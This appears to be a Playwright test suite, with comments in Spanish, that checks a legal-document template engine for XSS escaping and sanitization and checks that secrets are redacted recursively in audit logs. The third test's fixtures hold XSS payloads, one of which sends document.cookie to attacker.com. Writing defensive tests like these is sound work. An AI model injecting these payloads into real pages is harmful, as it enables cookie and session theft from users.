// ==============================================================================
// TEST SUITE: Fase 1 - Mitigación XSS y Sanitización Recursiva de Secretos
// Bloques I & J: Docflow Template XSS Defense & Audit Log Deep Sanitization
// ==============================================================================

import { test, expect } from '@playwright/test';
import { renderTemplate, escapeHtml, sanitizeHtml } from '../src/lib/docflow/templateEngine';
import { deepSanitizeSecrets, logAuditEvent } from '../src/lib/auditService';

test.describe('Fase 1 - Bloques I & J: XSS Defense & Audit Secrets Sanitization', () => {
  test('1. Escape HTML estricto en variables dinámicas', () => {
    const maliciousInput = '<script>alert("XSS")</script>';
    const escaped = escapeHtml(maliciousInput);
    expect(escaped).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
    expect(escaped).not.toContain('<script>');
  });

  test('2. Sanitización de HTML peligroso y event handlers', () => {
    const dangerousHtml = '<div class="p-4"><img src="x" onerror="alert(1)" /><a href="javascript:stealCookies()">Click</a><script>evil()</script><strong>Documento Válido</strong></div>';
    const cleanHtml = sanitizeHtml(dangerousHtml);

    expect(cleanHtml).not.toContain('<script>');
    expect(cleanHtml).not.toContain('onerror=');
    expect(cleanHtml).not.toContain('javascript:');
    expect(cleanHtml).toContain('<strong>Documento Válido</strong>');
  });

  test('3. Renderizado de plantilla con inyección maliciosa en datos de expediente', () => {
    const template = '<h1>Contrato de Mutuo</h1><p>Prestatario: {{applicant.full_name}}</p><p>Garantía: {{property.address}}</p>';
    const maliciousCaseData: any = {
      applicant: {
        full_name: '<script>document.location="http://attacker.com/steal?c="+document.cookie</script>',
      },
      property: {
        address: '<img src=invalid onerror=fetch("http://attacker.com")>',
      },
      loan: {
        currency: 'USD',
      }
    };

    const rendered = renderTemplate(template, maliciousCaseData);
    expect(rendered).not.toContain('<script>');
    expect(rendered).not.toContain('onerror=');
    expect(rendered).toContain('&lt;script&gt;');
    expect(rendered).toContain('&lt;img');
  });

  test('4. Sanitización recursiva de secretos en objetos anidados de auditoría (Bloque J)', () => {
    const sensitivePayload = {
      user_id: 'usr_123',
      action: 'UPDATE_CREDENTIALS',
      metadata: {
        plain_text_password: 'SuperSecretPassword123!',
        auth: {
          token: 'jwt.header.payload.signature',
          access_token: 'acc_token_xyz',
          refresh_token: 'ref_token_xyz',
          secrets_vault: {
            api_key: 'sk_live_1234567890',
            cookie: 'session_id=abcdef123456',
            bearer: 'Bearer token123',
          }
        },
        public_info: {
          tenant_name: 'Estudio Jurídico',
          role: 'admin',
        }
      }
    };

    const sanitized = deepSanitizeSecrets(sensitivePayload);

    // Comprobar que todos los secretos fueron redactados recursivamente
    expect(sanitized.metadata.plain_text_password).toBe('[REDACTED_SECRET]');
    expect(sanitized.metadata.auth.token).toBe('[REDACTED_SECRET]');
    expect(sanitized.metadata.auth.access_token).toBe('[REDACTED_SECRET]');
    expect(sanitized.metadata.auth.refresh_token).toBe('[REDACTED_SECRET]');
    expect(sanitized.metadata.auth.secrets_vault.api_key).toBe('[REDACTED_SECRET]');
    expect(sanitized.metadata.auth.secrets_vault.cookie).toBe('[REDACTED_SECRET]');
    expect(sanitized.metadata.auth.secrets_vault.bearer).toBe('[REDACTED_SECRET]');

    // Comprobar que los datos seguros no se alteraron
    expect(sanitized.user_id).toBe('usr_123');
    expect(sanitized.metadata.public_info.tenant_name).toBe('Estudio Jurídico');
    expect(sanitized.metadata.public_info.role).toBe('admin');
  });

  test('5. Registro inmutable de auditoría con persistencia sanitizada', async () => {
    const entry = await logAuditEvent({
      organizationId: 'd0000000-0000-0000-0000-000000000001',
      userId: 'usr_audit_test',
      userName: 'Validador QA',
      action: 'GENERAR_DOCUMENTO',
      module: 'Docflow',
      recordIdentifier: 'DOC-TEST-001',
      metadata: {
        nested_credentials: {
          password: 'Secret123Password',
          api_key: 'key-123456',
        },
        document_type: 'mutuo_hipotecario',
      }
    });

    expect(entry.metadata?.nested_credentials?.password).toBe('[REDACTED_SECRET]');
    expect(entry.metadata?.nested_credentials?.api_key).toBe('[REDACTED_SECRET]');
    expect(entry.metadata?.document_type).toBe('mutuo_hipotecario');
  });
});
